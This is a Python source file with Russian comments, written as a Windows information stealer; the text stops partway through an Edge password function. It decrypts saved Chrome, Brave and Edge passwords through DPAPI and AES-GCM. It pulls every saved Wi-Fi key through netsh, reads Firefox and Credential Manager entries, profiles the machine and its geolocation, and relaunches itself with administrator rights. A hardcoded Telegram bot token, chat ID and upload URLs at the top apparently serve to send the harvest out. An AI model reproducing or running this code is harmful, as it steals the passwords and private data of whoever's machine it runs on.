import platform
import socket
import uuid
import psutil
import wmi
import datetime
import requests
import getpass
import os
import subprocess
from winreg import ConnectRegistry, OpenKey, HKEY_LOCAL_MACHINE, QueryValueEx, EnumKey, CloseKey
import win32net
import ctypes
from docx import Document
import sys
import time
import sqlite3
import win32crypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64
import json
import re
import shutil
import shlex

# ========================
#  Настройки Telegram-1002244070038
# ========================
TELEGRAM_CONFIG = {
    "CHAT_ID": "6086449054",  # Здесь укажите нужный chat_id
    "BOT_TOKEN": "6871167004:AAG63-lwqImzNoWPP8Siq6ZFRSfC5GxF-vk",  # Токен вашего бота
}
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_CONFIG['BOT_TOKEN']}/sendDocument"
TELEGRAM_MESSAGE_URL = f"https://api.telegram.org/bot{TELEGRAM_CONFIG['BOT_TOKEN']}/sendMessage"

# Флаг для скрытия консоли (только для Windows)
CREATE_NO_WINDOW = subprocess.CREATE_NO_WINDOW

# ================================
#  Словарь переводов для разделов
# ================================
SECTION_TRANSLATIONS = {
    "System Info": "Сведения о системе",
    "CPU Info": "Информация о процессоре",
    "GPU Info": "Информация о видеокарте",
    "Network Info": "Сетевая информация",
    "Geolocation": "Геолокация",
    "Wi-Fi Info": "Информация о Wi‑Fi",
    "Memory Info": "Информация об оперативной памяти",
    "Disk Usage": "Использование диска",
    "Battery Info": "Информация о батарее",
    "Screen Resolution": "Разрешение экрана",
    "BIOS Info": "Информация о BIOS",
    "Motherboard Info": "Информация о материнской плате",
    "Installed Programs": "Установленные программы",
    "Services": "Службы",
    "Drivers": "Драйверы",
    "USB Devices": "USB-устройства",
    "Environment Variables": "Переменные окружения",
    "Local Users": "Локальные пользователи",
    "Local Groups": "Локальные группы",
    "Chrome Passwords": "Пароли Chrome",
    "Firefox Passwords": "Пароли Firefox",
    "Credential Manager": "Диспетчер учётных данных",
    "Edge Passwords": "Пароли Edge",
    "WhatsApp Data": "Данные WhatsApp",
    "Telegram Data": "Данные Telegram",
    "Chrome Addresses": "Адреса Chrome (автофил)",
    "Device Info": "Информация об устройстве",
    "Monitor Info": "Информация о мониторах",
    "Available Wi-Fi Networks": "Доступные Wi‑Fi сети",
    "Bluetooth Info": "Информация о Bluetooth",
    "RAM Info": "Информация об ОЗУ (WMIC)",
    "Disk Info": "Информация о дисках",
    "Process Info (Network)": "Информация о процессах (с сетевыми соединениями)",
    "Security Info": "Информация по безопасности",
    "Account Info": "Информация об учётных записях",
    "Logs and Debug Info": "Логи и отладочная информация",
    "DateTime": "Дата и время"
}

# ==============
#  Функции
# ==============

def run_command(args, codepage='866'):
    """
    Запускаем:
      1) chcp <codepage> >nul
      2) основную команду (пробелами объединяем элементы args)
    Затем ПЫТАЕМСЯ декодировать результат в нескольких кодировках (cp866 → cp1251 → utf-8 → cp437).
    """
    cmd_str = f'chcp {codepage} >nul & ' + ' '.join(args)
    print("CMD:", cmd_str)

    try:
        output = subprocess.check_output(
            cmd_str,
            stderr=subprocess.STDOUT,
            shell=True,
            creationflags=CREATE_NO_WINDOW
        )
    except Exception:
        return "Not available"

    # Пробуем декодировать по порядку
    for enc in ("cp866", "cp1251", "utf-8", "cp437"):
        try:
            decoded = output.decode(enc, errors="replace")
            return decoded
        except:
            pass
    return "Not available"

def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except:
        return False

def restart_as_admin():
    """Перезапускает скрипт с правами администратора, если не хватает прав."""
    script_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
    try:
        result = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, f'"{script_path}"', None, 1
        )
        if result <= 32:
            return False
        time.sleep(2)
        sys.exit(0)
    except Exception:
        return False

def get_cpu_temperature():
    """Извлекает температуру CPU через OpenHardwareMonitor (если запущен)."""
    try:
        wmi_obj = wmi.WMI(namespace="root\\OpenHardwareMonitor")
        for sensor in wmi_obj.Sensor():
            if sensor.SensorType == "Temperature" and "CPU" in sensor.Name:
                return f"{sensor.Value}°C"
        return "Not detected"
    except Exception:
        return "Not detected"

def get_local_groups():
    """Возвращает список локальных групп."""
    try:
        groups = win32net.NetLocalGroupEnum(None, 0)[0]
        return [f"Group: {group['name']}" for group in groups] if groups else ["None found"]
    except Exception:
        return ["None found"]

def get_services():
    """Возвращает список служб."""
    try:
        services = []
        for service in psutil.win_service_iter():
            try:
                services.append(f"Name: {service.name()}, Status: {service.status()}")
            except Exception:
                continue
        return services if services else ["None found"]
    except Exception:
        return ["None found"]

def get_drivers():
    """Возвращает список системных драйверов."""
    try:
        drivers = [f"Name: {driver.Name}, State: {driver.State}" for driver in wmi.WMI().Win32_SystemDriver()]
        return drivers if drivers else ["None found"]
    except Exception:
        return ["None found"]

def get_usb_devices():
    """Возвращает список подключённых USB-устройств."""
    try:
        devices = [f"Name: {usb.Description}" for usb in wmi.WMI().Win32_USBHub()]
        return devices if devices else ["None found"]
    except Exception:
        return ["None found"]

def get_gpu_info():
    """Основная информация о видеокартах."""
    try:
        wmi_obj = wmi.WMI()
        gpus = wmi_obj.Win32_VideoController()
        gpu_list = []
        for gpu in gpus:
            memory = f"{gpu.AdapterRAM // (1024 ** 2)} MB" if gpu.AdapterRAM and gpu.AdapterRAM > 0 else "Not available"
            gpu_list.append(f"Name: {gpu.Name}, Memory: {memory}")
        return gpu_list if gpu_list else ["None found"]
    except Exception:
        return ["None found"]

def get_wifi_info():
    """
    1) Определяет текущую подключённую Wi‑Fi-сеть (SSID) + пароль
    2) Сканирует ближайшие (видимые) Wi‑Fi-сети и собирает SSID / BSSID / Уровень сигнала
    
    Требует прав администратора, иначе пароль для текущей сети не будет отображён.
    """
    if not is_admin():
        return {
            "Error": "Admin rights required to access Wi-Fi information."
        }
    
    data = {}

    # --------------------------
    # 1) ТЕКУЩАЯ СЕТЬ + ПАРОЛЬ
    # --------------------------
    interfaces_output = run_command(["netsh", "wlan", "show", "interfaces"])
    current_ssid = None
    # Ищем строку вида "SSID            : MyNetwork"
    for line in interfaces_output.splitlines():
        line_strip = line.strip()
        if line_strip.lower().startswith("ssid") and "bssid" not in line_strip.lower():
            parts = line_strip.split(":", 1)
            if len(parts) > 1:
                current_ssid = parts[1].strip()
                break

    current_password = None
    if current_ssid:
        prof_output = run_command([
            "netsh", "wlan", "show", "profile",
            f"name={current_ssid}", "key=clear"
        ])
        print(prof_output)
        for l in prof_output.splitlines():
            l_strip = l.strip().lower()
            # Ищем строчку с "Key Content" или "Содержимое ключа"
            if l_strip.startswith("key content") or "содержимое ключа" in l_strip:
                parts = l.split(":", 1)
                if len(parts) > 1:
                    current_password = parts[1].strip()
                    break
        
        data["Current Wi-Fi"] = {
            "SSID": current_ssid,
            "Password": current_password if current_password else "Not found"
        }
    else:
        data["Current Wi-Fi"] = {
            "SSID": "Not connected",
            "Password": "N/A"
        }
    
    # ----------------------------------
    # 2) СПИСОК ВИДИМЫХ (БЛИЖАЙШИХ) Wi-Fi
    # ----------------------------------
    # netsh wlan show networks mode=bssid
    networks_output = run_command(["netsh", "wlan", "show", "networks", "mode=bssid"])
    nearby_networks = []
    current_net = {}
    
    # Логика парсинга: Когда начинаем новый "SSID", значит предыдущий блок можно добавить в список
    for line in networks_output.splitlines():
        line_strip = line.strip()

        # Строка вида "SSID 1 : MyNetwork"
        if line_strip.lower().startswith("ssid") and "bssid" not in line_strip.lower():
            # Если уже есть "current_net", сохраняем его
            if current_net:
                nearby_networks.append(current_net)
            current_net = {}
            parts = line_strip.split(":", 1)
            if len(parts) > 1:
                current_net["SSID"] = parts[1].strip()

        # Строка вида "BSSID 1 : xx:xx:xx:xx:xx:xx"
        elif line_strip.lower().startswith("bssid"):
            parts = line_strip.split(":", 1)
            if len(parts) > 1:
                # Собираем все BSSID в список
                current_net.setdefault("BSSIDs", []).append(parts[1].strip())

        # Строка вида "Signal : 63%"
        elif "signal" in line_strip.lower():
            parts = line_strip.split(":", 1)
            if len(parts) > 1:
                current_net["Signal"] = parts[1].strip()
    
    # Добавляем последний блок, если есть
    if current_net:
        nearby_networks.append(current_net)

    data["Nearby Networks"] = nearby_networks if nearby_networks else ["No nearby networks found"]
    
    return data

def get_installed_programs():
    """Список установленного ПО из реестра."""
    try:
        programs = []
        reg = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
        for key_path in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                         r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
            try:
                key = OpenKey(reg, key_path)
            except Exception:
                continue
            i = 0
            while True:
                try:
                    subkey_name = EnumKey(key, i)
                    subkey = OpenKey(key, subkey_name)
                    try:
                        name = QueryValueEx(subkey, "DisplayName")[0]
                        if name:
                            programs.append(f"Program: {name}")
                    except FileNotFoundError:
                        pass
                    finally:
                        CloseKey(subkey)
                    i += 1
                except OSError:
                    break
            CloseKey(key)
        CloseKey(reg)
        return programs if programs else ["None found"]
    except Exception:
        return ["None found"]

def get_local_users():
    """Возвращает список локальных пользователей."""
    try:
        users = win32net.NetUserEnum(None, 1, 0)[0]
        return [f"User: {user['name']}" for user in users] if users else ["None found"]
    except Exception:
        return ["None found"]

def get_geolocation():
    """Пытается получить геолокацию (страна, регион, город и т.д.) по публичному IP."""
    try:
        # Пробуем несколько сервисов
        for url in ["http://ip-api.com/json/", "https://ipinfo.io/json"]:
            response = requests.get(url, timeout=10)
            data = response.json()
            # ip-api.com отдает status=success, у ipinfo.io такого поля может не быть
            if data.get("status", "success") == "success" or url.endswith("ipinfo.io/json"):
                return {
                    "Country": data.get("country", "Unknown"),
                    "Region": data.get("regionName", data.get("region", "Unknown")),
                    "City": data.get("city", "Unknown"),
                    "ISP": data.get("isp", data.get("org", "Unknown")),
                    "Lat/Lon": f"{data.get('lat', 'Unknown')}, {data.get('lon', data.get('loc', 'Unknown'))}"
                }
    except Exception:
        pass
    return {"Geolocation": "Failed to retrieve"}

def get_environment_vars():
    """Пример извлечения некоторых переменных окружения."""
    try:
        return [
            f"PATH: {os.environ.get('PATH', 'Not found')}",
            f"USERNAME: {os.environ.get('USERNAME', 'Not found')}",
            f"USERPROFILE: {os.environ.get('USERPROFILE', 'Not found')}"
        ]
    except Exception:
        return ["Not available"]

def get_bios_info():
    """Информация о BIOS."""
    try:
        bios = wmi.WMI().Win32_BIOS()[0]
        return [
            f"Manufacturer: {bios.Manufacturer}",
            f"Name: {bios.Name}",
            f"Version: {bios.Version}",
            f"Serial Number: {bios.SerialNumber}",
            f"Release Date: {bios.ReleaseDate[:4]}-{bios.ReleaseDate[4:6]}-{bios.ReleaseDate[6:8]}"
        ]
    except Exception:
        return ["Failed to retrieve"]

def get_motherboard_info():
    """Информация о материнской плате."""
    try:
        board = wmi.WMI().Win32_BaseBoard()[0]
        return [
            f"Manufacturer: {board.Manufacturer}",
            f"Product: {board.Product}",
            f"Serial Number: {board.SerialNumber}"
        ]
    except Exception:
        return ["Failed to retrieve"]

def get_cpu_detailed_info():
    """Основная информация о CPU (через WMI)."""
    try:
        cpus = wmi.WMI().Win32_Processor()
        info = []
        for cpu in cpus:
            info.extend([
                f"Name: {cpu.Name}",
                f"Cores: {cpu.NumberOfCores}",
                f"Max Clock: {cpu.MaxClockSpeed} MHz",
                f"Current Clock: {cpu.CurrentClockSpeed} MHz",
                f"Socket: {cpu.SocketDesignation}"
            ])
        return info if info else ["None found"]
    except Exception:
        return ["None found"]

def get_cpu_detailed():
    """Детальная информация о CPU (логические ядра, кэши, температура и т.д.)."""
    try:
        w_obj = wmi.WMI()
        cpus = w_obj.Win32_Processor()
        if cpus:
            cpu = cpus[0]
            logical = cpu.NumberOfLogicalProcessors
            cores = cpu.NumberOfCores
            cache_lines = run_command(["wmic", "cpu", "get", "L2CacheSize,L3CacheSize"]).splitlines()
            l2 = "Not found"
            l3 = "Not found"
            if len(cache_lines) >= 2:
                parts = cache_lines[1].split()
                if len(parts) >= 2:
                    l2 = parts[0] + " KB"
                    l3 = parts[1] + " KB"
            core_load = psutil.cpu_percent(interval=1, percpu=True)
            return {
                "Logical Processors": logical,
                "Cores": cores,
                "Per-Core Load (%)": core_load,
                "L2 Cache": l2,
                "L3 Cache": l3,
                "CPU Temperature": get_cpu_temperature()
            }
    except Exception:
        pass
    return {"CPU Detailed": "Not available"}

def get_gpu_detailed():
    """Детальная информация о GPU (преимущественно для NVIDIA, через nvidia-smi)."""
    try:
        nvidia = shutil.which("nvidia-smi")
        if nvidia:
            output = run_command([
                nvidia,
                "--query-gpu=temperature.gpu,utilization.gpu,memory.total,memory.used",
                "--format=csv,noheader,nounits"
            ])
            parts = output.strip().split(',')
            if len(parts) >= 4:
                return {
                    "GPU Temperature": parts[0].strip() + "°C",
                    "GPU Utilization": parts[1].strip() + "%",
                    "Total VRAM": parts[2].strip() + " MB",
                    "Used VRAM": parts[3].strip() + " MB"
                }
        return {
            "GPU Temperature": "Not available",
            "GPU Utilization": "Not available",
            "Total VRAM": "Not available",
            "Used VRAM": "Not available"
        }
    except Exception:
        return {"GPU Detailed": "Not available"}

def get_monitor_info():
    """Информация о мониторах (разрешение, частота)."""
    try:
        output = run_command(["wmic", "desktopmonitor", "get", "ScreenWidth,ScreenHeight,RefreshRate"], codepage='cp437')
        lines = output.splitlines()
        monitors = []
        if len(lines) >= 2:
            for line in lines[1:]:
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 3:
                        monitors.append({
                            "Resolution": f"{parts[0]}x{parts[1]}",
                            "Refresh Rate": parts[2] + " Hz"
                        })
        return monitors if monitors else ["Not available"]
    except Exception:
        return ["Not available"]

def get_network_details():
    """Расширенные сетевые детали (активные соединения, порты, MAC-адреса, трафик, DNS)."""
    try:
        active_connections = run_command(["netstat", "-ano"])
        open_ports = run_command(["netstat", "-an"])
        macs = {}
        for iface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    macs[iface] = addr.address
        traffic = psutil.net_io_counters(pernic=True)
        network_traffic = {iface: counter._asdict() if hasattr(counter, "_asdict") else str(counter)
                           for iface, counter in traffic.items()}
        ipconfig = run_command(["ipconfig", "/all"])
        dns_servers = [line.split(":", 1)[1].strip() for line in ipconfig.splitlines() if "DNS Servers" in line]
        return {
            "Active Connections": active_connections,
            "Open Ports": open_ports,
            "MAC Addresses": macs,
            "Network Traffic": network_traffic,
            "DNS Servers": dns_servers
        }
    except Exception:
        return {"Network Details": "Not available"}

def get_chrome_encryption_key():
    """Получаем ключ шифрования Chrome из Local State."""
    try:
        local_state_path = os.path.join(
            os.environ["USERPROFILE"],
            "AppData",
            "Local",
            "Google",
            "Chrome",
            "User Data",
            "Local State"
        )
        if not os.path.exists(local_state_path):
            return None
        with open(local_state_path, "r", encoding="cp437") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt_chrome_password(encrypted_password, key):
    """Расшифровываем пароль Chrome (v10 / v11 или Legacy)."""
    try:
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            nonce = encrypted_password[3:15]
            ciphertext = encrypted_password[15:-16]
            tag = encrypted_password[-16:]
            cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted = decryptor.update(ciphertext) + decryptor.finalize()
            return decrypted.decode("cp437")
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode("cp437")
    except Exception:
        return "Not available"

def get_chrome_passwords():
    """Извлекает пароли из Chrome."""
    try:
        chrome_db = os.path.join(
            os.environ["USERPROFILE"],
            "AppData",
            "Local",
            "Google",
            "Chrome",
            "User Data",
            "Default",
            "Login Data"
        )
        if not os.path.exists(chrome_db):
            return ["Chrome passwords: Database not found"]
        temp_db = "LoginData_temp"
        shutil.copyfile(chrome_db, temp_db)
        key = get_chrome_encryption_key()
        if not key:
            return ["Chrome passwords: Failed to retrieve encryption key"]
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        passwords = []
        for url, username, encrypted_password in cursor.fetchall():
            if url and username and encrypted_password:
                password = decrypt_chrome_password(encrypted_password, key)
                passwords.append(f"URL: {url}, Username: {username}, Password: {password}")
        conn.close()
        os.remove(temp_db)
        return passwords if passwords else ["Chrome passwords: None found"]
    except Exception:
        return ["Chrome passwords: Failed to retrieve"]

def get_brave_passwords():
    """
    Извлекает сохранённые пароли из Brave, перебирая все профили (Default, Profile 1, ...).
    Аналогично механике Chrome/Edge: находим Local State, достаём ключ, копируем Login Data, расшифровываем.
    """
    results = []

    # 1) Папка User Data (где хранятся профили и Local State)
    brave_user_data_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "BraveSoftware",
        "Brave-Browser",
        "User Data"
    )
    if not os.path.exists(brave_user_data_path):
        return ["Brave User Data folder not found"]

    # 2) Файл Local State (для ключа шифрования)
    local_state_path = os.path.join(brave_user_data_path, "Local State")
    if not os.path.exists(local_state_path):
        return ["Brave Local State not found"]

    # 3) Достаём ключ шифрования (DPAPI + base64), аналог Chrome/Edge
    try:
        with open(local_state_path, "r", encoding="cp437") as f:
            local_state = json.load(f)
        # base64, отрезаем первые 5 байт "DPAPI"
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return ["Brave passwords: Failed to retrieve encryption key"]

    # 4) Перебираем все папки профилей ("Default", "Profile 1", "Profile 2", ...),
    #    Ищем в каждой "Login Data", пытаемся прочитать.
    profiles_found = False
    for folder_name in os.listdir(brave_user_data_path):
        folder_full = os.path.join(brave_user_data_path, folder_name)
        if os.path.isdir(folder_full):
            login_db = os.path.join(folder_full, "Login Data")
            if os.path.exists(login_db):
                profiles_found = True
                temp_db = "BraveLoginData_temp"
                try:
                    shutil.copyfile(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                    for url, username, enc_password in cursor.fetchall():
                        if not url or not enc_password:
                            continue

                        # Расшифровываем точно так же, как в Chrome/Edge
                        password = "Not available"
                        try:
                            if enc_password.startswith(b'v10') or enc_password.startswith(b'v11'):
                                nonce = enc_password[3:15]
                                ciphertext = enc_password[15:-16]
                                tag = enc_password[-16:]
                                cipher = Cipher(
                                    algorithms.AES(key),
                                    modes.GCM(nonce, tag),
                                    backend=default_backend()
                                )
                                decryptor = cipher.decryptor()
                                decrypted = decryptor.update(ciphertext) + decryptor.finalize()
                                password = decrypted.decode("cp437", errors="replace")
                            else:
                                # Legacy
                                password = win32crypt.CryptUnprotectData(
                                    enc_password, None, None, None, 0
                                )[1].decode("cp437", errors="replace")
                        except Exception:
                            pass

                        results.append(
                            f"Profile: {folder_name}, URL: {url}, Username: {username}, Password: {password}"
                        )

                    conn.close()
                    os.remove(temp_db)
                except Exception as e:
                    results.append(f"Error reading profile '{folder_name}': {e}")
                    if os.path.exists(temp_db):
                        os.remove(temp_db)

    if not profiles_found:
        return ["Brave passwords: No Login Data files found"]

    return results if results else ["Brave passwords: None found"]

def get_firefox_passwords():
    """Псевдо-извлечение паролей из Firefox (без расшифровки)."""
    try:
        firefox_profiles_path = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
        if not os.path.exists(firefox_profiles_path):
            return ["Firefox passwords: Profile not found"]
        passwords = []
        for profile in os.listdir(firefox_profiles_path):
            profile_path = os.path.join(firefox_profiles_path, profile)
            logins_file = os.path.join(profile_path, "logins.json")
            if os.path.exists(logins_file):
                with open(logins_file, 'r') as f:
                    data = json.load(f)
                for login in data.get("logins", []):
                    url = login.get("hostname", "Unknown")
                    username = login.get("encryptedUsername", "")
                    password = login.get("encryptedPassword", "")
                    passwords.append(f"URL: {url}, Username: {username} (encrypted), Password: {password} (encrypted)")
        return passwords if passwords else ["Firefox passwords: None found"]
    except Exception:
        return ["Firefox passwords: None found"]

def get_credential_manager_passwords():
    """Извлекает данные из Диспетчера учётных данных Windows (cmdkey /list)."""
    try:
        output = run_command("cmdkey /list", shell=True)
        credentials = []
        current_target = None
        for line in output.splitlines():
            line = line.strip()
            if line.startswith("Target:"):
                current_target = line.split("Target:", 1)[1].strip()
            elif line.startswith("User:") and current_target:
                username = line.split("User:", 1)[1].strip()
                credentials.append(f"Target: {current_target}, Username: {username}, Password: Not accessible")
        return credentials if credentials else ["Credential Manager: None found"]
    except Exception:
        return ["Credential Manager: None found"]

def get_all_saved_wifi():
    """
    Возвращает все сохранённые на русской Windows Wi-Fi сети (SSID) + пароль.
    Для каждой сети вызывается 'netsh wlan show profile name=... key=clear'.
    
    Требует прав администратора, иначе пароли не будут отображены.
    """
    if not is_admin():
        return {
            "Error": "Admin rights required to access Wi-Fi information."
        }

    saved_profiles_output = run_command(["netsh", "wlan", "show", "profiles"], codepage="utf-8")
    print(saved_profiles_output)
    print("/|" * 50)
    saved_profiles = []
    # Ищем строки вида:
    #   "Все профили пользователей     : MyNetwork"
    #   "All User Profile     : MyNetwork"
    for line in saved_profiles_output.splitlines():
        line_strip = line.strip().lower()
        if (("all user profile" in line_strip or "все профили пользователей" in line_strip)
            and ":" in line):
            parts = line.split(":", 1)
            if len(parts) > 1:
                profile_name = parts[1].strip()
                saved_profiles.append(profile_name)

    print(saved_profiles)
    # Для каждого профиля берём пароль
    results = []
    for prof in saved_profiles:
        # Выводим в консоль команду, где name="prof"
        print(f'netsh wlan show profile name="{prof}" key=clear')

        # А при вызове run_command тоже указываем name="prof"
        prof_output = run_command([
            "netsh", "wlan", "show", "profile",
            f'name="{prof}"',
            "key=clear"
        ], codepage="utf-8")

        pw = None
        for line in prof_output.splitlines():
            l_strip = line.strip().lower()
            if l_strip.startswith("key content") or "содержимое ключа" in l_strip:
                parts = line.split(":", 1)
                if len(parts) > 1:
                    pw = parts[1].strip()
                    break

        results.append({
            "SSID": prof,
            "Password": pw if pw else "Not found"
        })
    
    if not results:
        return {"Saved Wi-Fi Networks": ["No saved networks found"]}
    else:
        return {"Saved Wi-Fi Networks": results}

def get_bluetooth_info():
    """Информация о Bluetooth-устройствах (через PowerShell)."""
    try:
        output = run_command(["powershell", "-Command", "Get-PnpDevice -Class Bluetooth"], codepage='cp437')
        return output.splitlines() if output else ["Not available"]
    except Exception:
        return ["Not available"]

def get_ram_info():
    """Сырой вывод WMIC по памяти (Speed, MemoryType, Manufacturer, Capacity)."""
    try:
        output = run_command(["wmic", "memorychip", "get", "Speed,MemoryType,Manufacturer,Capacity"], codepage='cp437')
        return output.strip().splitlines() if output else ["Not available"]
    except Exception:
        return ["Not available"]

def get_disk_info():
    """Сырой вывод WMIC по дискам (Model, InterfaceType, MediaType, Status)."""
    try:
        output = run_command(["wmic", "diskdrive", "get", "Model,InterfaceType,MediaType,Status"], codepage='cp437')
        return output.strip().splitlines() if output else ["Not available"]
    except Exception:
        return ["Not available"]

def get_process_info():
    """Процессы, имеющие сетевые соединения (psutil)."""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                conns = proc.net_connections()
                if conns:
                    processes.append({"PID": proc.pid, "Name": proc.info['name'], "Connections": len(conns)})
            except Exception:
                continue
        return processes if processes else ["Not available"]
    except Exception:
        return ["Not available"]

def get_security_info():
    """Информация по безопасности (последние события системы, антивирус, активные пользователи, задачи)."""
    try:
        system_events = run_command(["wevtutil", "qe", "System", "/c:5", "/f:text"], codepage='cp437')
        av_status = run_command(["wmic", "/namespace:\\\\root\\SecurityCenter2", "path", "AntiVirusProduct", "get", "displayName,productState"], codepage='cp437')
        active_users = run_command("query user", shell=True, codepage='cp437')
        login_attempts = run_command(["wevtutil", "qe", "Security", "/c:5", "/f:text"], codepage='cp437')
        scheduled_tasks = run_command(["schtasks", "/query", "/fo", "LIST"], codepage='cp437')
        return {
            "Recent System Events": system_events,
            "Antivirus Status": av_status,
            "Active Users/Sessions": active_users,
            "Recent Login Attempts": login_attempts,
            "Scheduled Tasks": scheduled_tasks
        }
    except Exception:
        return {"Security Info": "Not available"}

def get_account_info():
    """Информация об учётных записях (Microsoft / локальные администраторы)."""
    try:
        ms_accounts = run_command(["dsregcmd", "/status"], codepage='cp437')
        admin_accounts = run_command(["net", "localgroup", "Administrators"], codepage='cp437')
        return {
            "Microsoft Accounts": ms_accounts if ms_accounts.strip() else "Not available",
            "Administrator Accounts": admin_accounts,
            "User Groups": get_local_groups()
        }
    except Exception:
        return {"Account Info": "Not available"}

def get_logs_and_debug_info():
    """Некоторые логи и дебаг-информация (события Application, Shutdown, аптайм)."""
    try:
        app_events = run_command(["wevtutil", "qe", "Application", "/c:5", "/f:text"], codepage='cp437')
        shutdown_events = run_command([
            "wevtutil", "qe", "System", "/c:5",
            "/q:*[System[(EventID=1074) or (EventID=6006)]]", "/f:text"
        ], codepage='cp437')
        uptime_seconds = time.time() - psutil.boot_time()
        uptime_str = str(datetime.timedelta(seconds=int(uptime_seconds)))
        return {
            "Application Events": app_events,
            "Recent Shutdown/Restart Events": shutdown_events,
            "System Uptime": uptime_str
        }
    except Exception:
        return {"Logs and Debug Info": "Not available"}

def get_device_info():
    """Информация об устройстве (серийник, модель, дата установки ОС и т.д.)."""
    try:
        serial_lines = run_command(["wmic", "bios", "get", "serialnumber"], codepage='cp437').splitlines()
        serial = serial_lines[1].strip() if len(serial_lines) >= 2 else "Not found"
        model_lines = run_command(["wmic", "csproduct", "get", "name"], codepage='cp437').splitlines()
        model = model_lines[1].strip() if len(model_lines) >= 2 else "Not found"
        os_install_lines = run_command(["wmic", "os", "get", "InstallDate"], codepage='cp437').splitlines()
        os_install = os_install_lines[1].strip() if len(os_install_lines) >= 2 else "Not found"
        bios_lines = run_command(["wmic", "bios", "get", "smbiosbiosversion,releasedate"], codepage='cp437').splitlines()
        bios_ver = "Not found"
        bios_date = "Not found"
        for line in bios_lines:
            if line and "smbiosbiosversion" not in line.lower():
                parts = line.split()
                if len(parts) >= 2:
                    bios_ver = parts[0]
                    bios_date = parts[1]
                    break
        return {
            "Device Serial Number": serial,
            "Device Model": model,
            "OS Install Date": os_install,
            "BIOS Version": bios_ver,
            "BIOS Release Date": bios_date
        }
    except Exception:
        return {"Device Info": "Not available"}

def get_disk_usage():
    """Возвращает список строк с информацией о разделе/диске (Total, Free)."""
    usage_info = []
    try:
        partitions = psutil.disk_partitions(all=False)
        for partition in partitions:
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                total_gb = round(usage.total / (1024 ** 3), 2)
                free_gb = round(usage.free / (1024 ** 3), 2)
                usage_info.append(f"{partition.device}: Total: {total_gb} GB, Free: {free_gb} GB")
            except Exception:
                # Если возникает ошибка для конкретного диска, пропускаем
                continue
        return usage_info
    except Exception as e:
        return [f"Disk Usage: Error occurred - {e}"]

# Новые добавленные функции:
def get_edge_passwords():
    """
    Извлекает все пароли из всех профилей Microsoft Edge.
    Аналогично Chrome: ищет Local State для ключа шифрования и перебирает папки профилей.
    Возвращает список строк с данными: URL, Username, Password.
    """
    results = []
    
    # 1) Находим папку User Data (там лежат профили и Local State)
    edge_user_data_path = os.path.join(
        os.environ["USERPROFILE"], 
        "AppData", 
        "Local", 
        "Microsoft", 
        "Edge", 
        "User Data"
    )
    if not os.path.exists(edge_user_data_path):
        return ["Edge User Data folder not found"]

    # 2) Находим Local State (чтобы вытащить ключ шифрования)
    local_state_path = os.path.join(edge_user_data_path, "Local State")
    if not os.path.exists(local_state_path):
        return ["Edge Local State file not found"]

    # 3) Достаём ключ шифрования из Local State (то же самое, что для Chrome)
    try:
        with open(local_state_path, "r", encoding="cp437") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return ["Edge passwords: Failed to retrieve encryption key"]

    # 4) Перебираем все подпапки (профили): "Default", "Profile 1", "Profile 2", ...
    #    Если там есть файл "Login Data", копируем и расшифровываем записи.
    profiles_found = False
    for folder_name in os.listdir(edge_user_data_path):
        folder_full = os.path.join(edge_user_data_path, folder_name)
        if os.path.isdir(folder_full):
            login_db = os.path.join(folder_full, "Login Data")
            if os.path.exists(login_db):
                profiles_found = True
                # Создаем временную копию базы
                temp_db = "EdgeLoginData_temp"
                try:
                    shutil.copyfile(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for url, username, enc_password in cursor.fetchall():
                        if url and enc_password:
                            # Расшифровка аналогична Chrome
                            password = "Not available"
                            try:
                                if enc_password.startswith(b'v10') or enc_password.startswith(b'v11'):
                                    nonce = enc_password[3:15]
                                    ciphertext = enc_password[15:-16]
                                    tag = enc_password[-16:]
                                    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                                    from cryptography.hazmat.backends import default_backend
                                    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
                                    decryptor = cipher.decryptor()
                                    decrypted = decryptor.update(ciphertext) + decryptor.finalize()
                                    password = decrypted.decode("cp437", errors="replace")
                                else:
                                    # Legacy DPAPI
                                    password = win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1].decode("cp437", errors="replace")
                            except Exception:
                                pass
                            
                            results.append(
                                f"Profile: {folder_name}, URL: {url}, Username: {username}, Password: {password}"
                            )
                    
                    conn.close()
